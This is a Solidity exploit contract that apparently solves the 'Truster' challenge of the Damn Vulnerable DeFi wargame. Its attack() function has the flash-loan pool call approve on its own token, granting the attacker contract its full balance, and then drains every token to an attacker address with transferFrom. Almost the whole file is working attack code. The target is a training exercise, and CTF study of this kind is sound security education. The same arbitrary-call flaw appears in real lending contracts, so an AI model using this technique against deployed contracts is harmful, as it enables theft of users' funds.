// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {TrusterLenderPool} from "../src/TrusterLenderPool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract Target {
    DamnValuableToken public token;
    TrusterLenderPool public pool;

    address public attacker;

    constructor(
        DamnValuableToken _token,
        TrusterLenderPool _pool,
        address _attacker
    ) {
        token = _token;
        pool = _pool;
        attacker = _attacker;
    }

    function attack() external {
        uint256 poolBalance = token.balanceOf(address(pool)); // 1 million DVTs

        /* low level call data making
         bytes memory data = abi.encodeWithSignature(
             "approve(address,uint256)",
             address(this),
             type(uint256).max
         );
         pool.flashLoan(0, address(this), address(token), data); */

        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                poolBalance
            )
        );

        // Now that we have approval, drain the funds
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}
